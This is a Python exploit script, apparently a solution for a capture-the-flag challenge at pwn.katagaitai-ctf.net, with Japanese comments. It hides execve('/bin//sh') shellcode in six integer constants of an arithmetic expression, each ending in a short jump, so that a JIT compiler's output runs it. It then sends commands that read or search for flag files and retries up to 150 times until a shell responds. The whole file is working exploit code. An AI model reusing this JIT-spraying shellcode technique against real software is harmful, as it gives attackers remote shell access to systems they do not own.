#!/usr/bin/env python3
import socket
import time

HOST = "pwn.katagaitai-ctf.net"
PORT = 9006

# 6つのシェルコード片
# 各片の末尾に jmp +5 を付けて、
# JITが生成する命令を飛び越える
STAGES = [
    bytes.fromhex("31d231c050"),
    bytes.fromhex("682f62696e"),
    bytes.fromhex("b82f2f7368"),
    bytes.fromhex("89442404"),
    bytes.fromhex("4889e731f6"),
    bytes.fromhex("31c0b03b0f05"),
]


def make_payload():
    def encode(chunk):
        assert len(chunk) <= 6

        chunk = chunk.ljust(6, b"\x90") + b"\xeb\x05"

        return str(
            int.from_bytes(chunk, "little")
        ).encode()

    # JITコードのオフセット0x37から実行させる
    expr = b"1+1+1+1+" + b"+".join(
        map(encode, STAGES)
    )

    while len(expr) < 253:
        expr += b"+1"

    if len(expr) == 253:
        expr += b"+1"

    if len(expr) == 254:
        expr += b"0"

    assert len(expr) == 255, len(expr)

    expr += b"+"
    expr += b"7"

    assert len(expr) == 257

    return expr


payload = make_payload()

commands = (
    b"echo __SHELL_OK__\n"
    b"id\n"
    b"cat /flag /flag.txt /app/flag /home/ctf/flag "
    b"./flag ./flag.txt 2>/dev/null\n"
    b"find / -maxdepth 3 -iname '*flag*' "
    b"-type f 2>/dev/null | head -30\n"
    b"exit\n"
)

for attempt in range(1, 151):
    try:
        with socket.create_connection(
            (HOST, PORT), timeout=4
        ) as s:

            s.settimeout(2)

            s.sendall(
                payload + b"\n" + commands
            )

            out = bytearray()

            while True:
                try:
                    data = s.recv(4096)

                    if not data:
                        break

                    out.extend(data)

                except socket.timeout:
                    break

            if b"__SHELL_OK__" in out:
                print(
                    f"[+] Shell obtained on attempt {attempt}"
                )

                print(
                    out.decode(
                        "utf-8",
                        errors="replace"
                    )
                )
                break

            if attempt % 10 == 0:
                print(
                    f"[-] Attempt {attempt}: "
                    f"{bytes(out[:100])!r}",
                    flush=True
                )

    except (OSError, TimeoutError) as e:
        if attempt % 10 == 0:
            print(
                f"[-] Attempt {attempt}: {e}",
                flush=True
            )

    time.sleep(0.05)

else:
    print("[-] No shell after 150 attempts")
